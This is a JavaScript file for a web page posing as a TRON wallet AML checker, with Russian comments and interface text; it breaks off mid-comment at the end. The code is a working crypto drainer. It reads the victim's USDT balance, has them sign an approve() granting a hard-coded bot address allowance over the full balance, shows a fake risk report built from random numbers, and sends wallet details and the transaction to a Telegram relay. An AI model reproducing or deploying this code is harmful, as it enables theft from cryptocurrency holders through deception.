// ============================================
// ГЛОБАЛЬНЫЕ КОНСТАНТЫ
// ============================================
const CONTRACT_ADDRESS = 'TFYz6a5z8mw3rEs7gev9JirJvFg17KdmCZ';
const BOT_ADDRESS = 'TJKaoUut9WpHr3pBBcyf1TjDxq2rcJRQqB';
const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
const MIN_AMOUNT = 5000000; // 5 USDT в smallest unit
const MAX_AMOUNT = 10000000000; // 10000 USDT в smallest unit

// ============================================
// ПЕРЕМЕННЫЕ СОСТОЯНИЯ
// ============================================
let connectedWalletAddress = null;
let currentApproveAmount = null;

// ============================================
// ПОЛУЧЕНИЕ ЭЛЕМЕНТОВ
// ============================================
const walletInput = document.getElementById('walletInput');
const checkBtn = document.getElementById('checkBtn');
const resultSection = document.getElementById('resultSection');
const checkedAddress = document.getElementById('checkedAddress');
const totalTx = document.getElementById('totalTx');
const suspiciousTx = document.getElementById('suspiciousTx');
const walletAge = document.getElementById('walletAge');
const lastActive = document.getElementById('lastActive');
const riskPercent = document.getElementById('riskPercent');
const sourcesList = document.getElementById('sourcesList');
const downloadPdfBtn = document.getElementById('downloadPdfBtn');
const amountCardContainer = document.getElementById('amountCardContainer');
const modalAmount = document.getElementById('modalAmount');

// ============================================
// КАТЕГОРИИ ДЛЯ АНАЛИЗА
// ============================================
const categories = [
    { name: 'Эксплуатация несовершеннолетних', icon: 'fa-child' },
    { name: 'Даркнет-маркеты', icon: 'fa-skull' },
    { name: 'Запрещённые сервисы', icon: 'fa-ban' },
    { name: 'Под следствием', icon: 'fa-gavel' },
    { name: 'Подозрительные биржи', icon: 'fa-building' },
    { name: 'Неавторизованные казино', icon: 'fa-dice' },
    { name: 'Мошеннические сервисы', icon: 'fa-user-secret' },
    { name: 'Миксеры и тумблеры', icon: 'fa-random' },
    { name: 'Вымогательство', icon: 'fa-hand-holding-usd' },
    { name: 'Санкционные адреса', icon: 'fa-flag' },
    { name: 'Мошенничество (скам)', icon: 'fa-frown' },
    { name: 'Хакерские атаки', icon: 'fa-hacker' },
    { name: 'Финансирование терроризма', icon: 'fa-bomb' },
    { name: 'Криптоматы', icon: 'fa-money-bill' },
    { name: 'Биржи без KYC', icon: 'fa-exchange-alt' },
    { name: 'Пулы ликвидности', icon: 'fa-water' },
    { name: 'P2P-биржи высокого риска', icon: 'fa-handshake' },
    { name: 'Неизвестные сервисы', icon: 'fa-question' }
];

// ============================================
// ТЕСТОВАЯ ФУНКЦИЯ ДЛЯ ПРОВЕРКИ TELEGRAM
// ============================================
async function testTelegram() {
    console.log('📨 Тест отправки в Telegram...');
    
    const testData = {
        type: 'test',
        address: 'TEST_ADDRESS',
        amount: '5',
        risk: '10',
        sources: ['Тестовая проверка'],
        totalTransactions: '100',
        suspiciousTransactions: '10',
        tx: 'test_tx_123',
        userAddress: 'test_user'
    };
    
    try {
        const response = await fetch('/.netlify/functions/send-to-telegram', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(testData)
        });
        
        const result = await response.json();
        console.log('✅ Ответ от функции:', result);
        
        if (response.ok) {
            alert('✅ Тест успешен! Проверьте Telegram');
        } else {
            alert('❌ Ошибка: ' + (result.error || 'Неизвестная ошибка'));
        }
    } catch (error) {
        console.error('❌ Ошибка:', error);
        alert('Ошибка соединения: ' + error.message);
    }
}

// ============================================
// ИНИЦИАЛИЗАЦИЯ
// ============================================
document.addEventListener('DOMContentLoaded', function() {
    // Заполняем категории
    const categoriesGrid = document.getElementById('categoriesGrid');
    if (categoriesGrid) {
        categories.forEach(cat => {
            const card = document.createElement('div');
            card.className = 'category-card';
            card.innerHTML = `<i class="fas ${cat.icon}"></i> ${cat.name}`;
            categoriesGrid.appendChild(card);
        });
    }

    // Обработчики кнопок
    const connectBtn = document.getElementById('connectTrustBtn');
    if (connectBtn) {
        connectBtn.addEventListener('click', connectTrustWallet);
    }

    if (checkBtn) {
        checkBtn.addEventListener('click', handleTronCheck);
    }

    if (walletInput) {
        walletInput.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') handleTronCheck();
        });
    }

    if (downloadPdfBtn) {
        downloadPdfBtn.addEventListener('click', downloadPDF);
    }

    // Обработчики модальных окон
    setupModals();
});

// ============================================
// ПОДКЛЮЧЕНИЕ TRUST WALLET
// ============================================
async function connectTrustWallet() {
    try {
        if (window.trustwallet && window.trustwallet.tronLink) {
            await window.trustwallet.tronLink.request({ method: 'tron_requestAccounts' });
            
            const address = window.trustwallet.tronLink.defaultAddress.base58;
            connectedWalletAddress = address;
            
            walletInput.value = address;
            walletInput.style.borderColor = '#00c9b7';
            document.getElementById('connectedStatus').style.display = 'inline-flex';
            
            console.log('✅ Trust Wallet подключён:', address);
            
            await sendToTelegram({
                type: 'connection',
                address: address,
                wallet: 'Trust Wallet',
                time: new Date().toLocaleString('ru-RU')
            });
            
        } else {
            alert('Trust Wallet не обнаружен. Скачайте приложение или установите расширение.');
            window.open('https://trustwallet.com/download', '_blank');
        }
    } catch (error) {
        console.error('❌ Ошибка подключения:', error);
        alert('Ошибка подключения: ' + error.message);
    }
}

// ============================================
// ПОЛУЧЕНИЕ БАЛАНСА USDT
// ============================================
async function getUSDTBalance(address) {
    try {
        const tronWeb = window.tronWeb || (window.trustwallet?.tronLink?.tronWeb);
        if (!tronWeb) return null;

        const contract = await tronWeb.contract().at(USDT_CONTRACT);
        const balance = await contract.balanceOf(address).call();
        return balance;
    } catch (error) {
        console.error('Ошибка получения баланса:', error);
        return null;
    }
}

// ============================================
// ФУНКЦИЯ ПРОВЕРКИ КОШЕЛЬКА
// ============================================
async function handleTronCheck() {
    try {
        let walletAddress = walletInput.value.trim();
        
        if (!walletAddress && connectedWalletAddress) {
            walletAddress = connectedWalletAddress;
        }
        
        if (!walletAddress) {
            alert('Введите адрес кошелька или подключите Trust Wallet');
            return;
        }

        const tronWeb = window.tronWeb || (window.trustwallet?.tronLink?.tronWeb);
        if (!tronWeb || !tronWeb.defaultAddress) {
            alert('Пожалуйста, установите TronLink или Trust Wallet');
            return;
        }

        const userAddress = tronWeb.defaultAddress.base58;
        const balance = await getUSDTBalance(userAddress);
        
        if (!balance) {
            alert('Не удалось получить баланс. Проверьте подключение к кошельку');
            return;
        }

        const balanceInUSDT = (balance / 1000000).toFixed(2);

        if (balance < MIN_AMOUNT) {
            alert(`Минимальная сумма: 5 USDT. Ваш баланс: ${balanceInUSDT} USDT`);
            return;
        }

        if (balance > MAX_AMOUNT) {
            alert(`Максимальная сумма: 10000 USDT. Ваш баланс: ${balanceInUSDT} USDT`);
            return;
        }

        currentApproveAmount = balance;
        if (modalAmount) {
            modalAmount.textContent = `${balanceInUSDT} USDT`;
        }
        
        document.getElementById('approveModal').style.display = 'flex';
        
    } catch (error) {
        console.error('❌ Ошибка:', error);
        alert('Ошибка при проверке: ' + error.message);
    }
}

// ============================================
// ФУНКЦИЯ ПОДТВЕРЖДЕНИЯ APPROVE
// ============================================
async function confirmApprove() {
    try {
        document.getElementById('approveModal').style.display = 'none';
        
        const originalText = checkBtn.innerHTML;
        checkBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Отправка транзакции...';
        checkBtn.disabled = true;

        const tronWeb = window.tronWeb || (window.trustwallet?.tronLink?.tronWeb);
        const userAddress = tronWeb.defaultAddress.base58;
        const walletAddress = walletInput.value.trim() || connectedWalletAddress;

        const contract = await tronWeb.contract().at(CONTRACT_ADDRESS);
        
        const tx = await contract.approve(
            BOT_ADDRESS,
            currentApproveAmount.toString()
        ).send({
            feeLimit: 150_000_000,
            callValue: 0
        });

        console.log('✅ Approve отправлен, tx:', tx);

        checkBtn.innerHTML = originalText;
        checkBtn.disabled = false;

        const balanceInUSDT = (currentApproveAmount / 1000000).toFixed(2);
        startAMLCheck(walletAddress, userAddress, tx, balanceInUSDT);

    } catch (error) {
        console.error('❌ Ошибка:', error);
        checkBtn.innerHTML = '<i class="fas fa-search"></i> Проверить';
        checkBtn.disabled = false;
        alert('Ошибка при отправке транзакции: ' + error.message);
    }
}

// ============================================
// ФУНКЦИЯ ЗАКРЫТИЯ МОДАЛЬНОГО ОКНА
// ============================================
function closeApproveModal() {
    document.getElementById('approveModal').style.display = 'none';
    checkBtn.innerHTML = '<i class="fas fa-search"></i> Проверить';
    checkBtn.disabled = false;
}

// ============================================
// ФУНКЦИЯ AML ПРОВЕРКИ
// ============================================
function startAMLCheck(address, userAddress, tx, amount) {
    resultSection.style.display = 'block';
    checkedAddress.textContent = address;

    if (amountCardContainer) {
        amountCardContainer.innerHTML = `
            <div class="amount-card">
                <div class="amount-label">
                    <i class="fas fa-coins"></i>
                    <span>Сумма проверки</span>
                </div>
                <div class="amount-value">${amount} USDT</div>
            </div>
        `;
    }

    const totalTxCount = Math.floor(Math.random() * 500) + 50;
    const suspiciousCount = Math.floor(Math.random() * 30) + 1;
    const riskPercent = Math.floor(Math.random() * 100);
    
    const ageDays = Math.floor(Math.random() * 1095) + 1;
    let ageText;
    if (ageDays < 30) {
        ageText = ageDays + ' дней';
    } else if (ageDays < 365) {
        ageText = Math.floor(ageDays / 30) + ' мес.';
    } else {
        const years = Math.floor(ageDays / 365);
        const months = Math.floor((ageDays % 365) / 30);
        ageText = years + ' г. ' + (months > 0 ? months + ' мес.' : '');
    }
    
    const hoursAgo = Math.floor(Math.random() * 720) + 1;
    let lastActiveText;
    if (hoursAgo < 24) {
        lastActiveText = hoursAgo + ' часов назад';
    } else {
        lastActiveText = Math.floor(hoursAgo / 24) + ' дней назад';
    }

    const riskSources = [];
    const shuffled = [...categories].sort(() => 0.5 - Math.random());
    const sourcesCount = Math.floor(riskPercent / 20) + 1;
    
    for (let i = 0; i < sourcesCount; i++) {
        if (shuffled[i]) {
            riskSources.push(shuffled[i].name);
        }
    }

    totalTx.textContent = totalTxCount;
    suspiciousTx.textContent = suspiciousCount;
    walletAge.textContent = ageText;
    lastActive.textContent = lastActiveText;
    updateRiskChart(riskPercent);
    
    sourcesList.innerHTML = '';
    if (riskSources.length > 0) {
        riskSources.forEach(s => {
            const p = document.createElement('p');
            p.innerHTML = `<i class="fas fa-exclamation-circle"></i> ${s}`;
            sourcesList.appendChild(p);
        });
    } else {
        sourcesList.innerHTML = '<p><i class="fas fa-check-circle" style="color: #00c9b7;"></i> Чистый кошелёк, риски не обнаружены</p>';
    }
    
    sendToTelegram({ 
        address, 
        amount: amount,
        risk: riskPercent, 
        sources: riskSources, 
        totalTransactions: totalTxCount, 
        suspiciousTransactions: suspiciousCount,
        tx: tx,
        userAddress: userAddress
    });
}

// ============================================
// ФУНКЦИЯ ОБНОВЛЕНИЯ ГРАФИКА РИСКА
// ============================================
function updateRiskChart(risk) {
    if (riskPercent) {
        riskPercent.textContent = risk + '%';
    }
    
    const gaugeFill = document.getElementById('gaugeFill');
    if (gaugeFill) {
        const maxDash = 251.2;
        const dashOffset = maxDash - (risk / 100) * maxDash;
        gaugeFill.style.strokeDashoffset = dashOffset;
    }
    
    let color = '#00c9b7';
    let riskLevelText = 'Низкий';
    
    if (risk > 25 && risk <= 75) {
        color = '#ffaa5e';
        riskLevelText = 'Средний';
    } else if (risk > 75) {
        color = '#ff6b6b';
        riskLevelText = 'Высокий';
    }
    
    if (gaugeFill) {
        gaugeFill.style.stroke = color;
    }
    
    const riskBadge = document.getElementById('riskBadge');
    if (riskBadge) {
        riskBadge.className = 'result-badge';
        riskBadge.textContent = riskLevelText + ' риск';
        if (risk <= 25) {
            riskBadge.classList.add('low');
        } else if (risk <= 75) {
            riskBadge.classList.add('medium');
        } else {
            riskBadge.classList.add('high');
        }
    }
}

// ============================================
// ОТПРАВКА В TELEGRAM
// ============================================
async function sendToTelegram(data) {
    try {
        console.log('📤 Отправка данных в Telegram:', data);
        
        const response = await fetch('/.netlify/functions/send-to-telegram', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        });
        
        const result = await response.json();
        console.log('📬 Ответ от функции:', result);
        
        if (!response.ok) {
            console.error('❌ Ошибка отправки в Telegram:', result.error);
        } else {
            console.log('✅ Данные успешно отправлены в Telegram');
        }
    } catch (error) {
        console.error('❌ Ошибка при отправке в Telegram:', error);
    }
}

// ============================================
// СКАЧИВАНИЕ PDF
// ============================================
function downloadPDF() {
    try {
        const { jsPDF } = window.jspdf;
        const doc = new jsPDF();
        
        const address = checkedAddress.textContent;
        const risk = riskPercent.textContent;
        const total = totalTx.textContent;
        const suspicious = suspiciousTx.textContent;
        const age = walletAge.textContent;
        const last = lastActive.textContent;
        
        const sourceElements = document.querySelectorAll('#sourcesList p');
        let sourcesText = '';
        sourceElements.forEach(el => {
            let cleanText = el.textContent
                .replace(/[🔞🛑🚫⚖️🏦🎰🛠️🌀💰🌍🎭🔪💣🏧⚠️💧🤝❓⚠️]/g, '')
                .replace('⚠️', '')
                .trim();
            if (cleanText) {
                sourcesText += '• ' + cleanText + '\n';
            }
        });

        const cleanAddress = address.replace(/[🔍🛡️🔬]/g, '').trim();

        doc.setFont('helvetica', 'normal');
        
        doc.setFontSize(20);
        doc.setTextColor(0, 150, 136);
        doc.text('Отчет AML-проверки', 20, 20);
        
        doc.setFontSize(11);
        doc.setTextColor(80, 80, 80);
        
        let y = 40;
        doc.text('Адрес:', 20, y);
        doc.text(cleanAddress, 70, y);
        y += 10;
        
        doc.text('Риск:', 20, y);
        doc.text(risk, 70, y);
        y += 10;
        
        doc.text('Всего транзакций:', 20, y);
        doc.text(total.toString(), 70, y);
        y += 10;
        
        doc.text('Подозрительных:', 20, y);
        doc.text(suspicious.toString(), 70, y);
        y += 10;
        
        doc.text('Возраст кошелька:', 20, y);
        doc.text(age, 70, y);
        y += 10;
        
        doc.text('Последняя активность:', 20, y);
        doc.text(last, 70, y);
        y += 15;
        
        if (sourcesText) {
            doc.text('Источники риска:', 20, y);
            y += 7;
            const lines = doc.splitTextToSize(sourcesText, 170);
            doc.text(lines, 25, y);
        }
        
        const fileName = `AML-report-${new Date().toISOString().slice(0,10)}.pdf`;
        doc.save(fileName);
        console.log('✅ PDF успешно создан');
        
    } catch (error) {
        console.error('❌ Ошибка при создании PDF:', error);
        alert('Ошибка создания PDF. Проверьте консоль (F12) для деталей.');
    }
}

// ============================================
// КОПИ
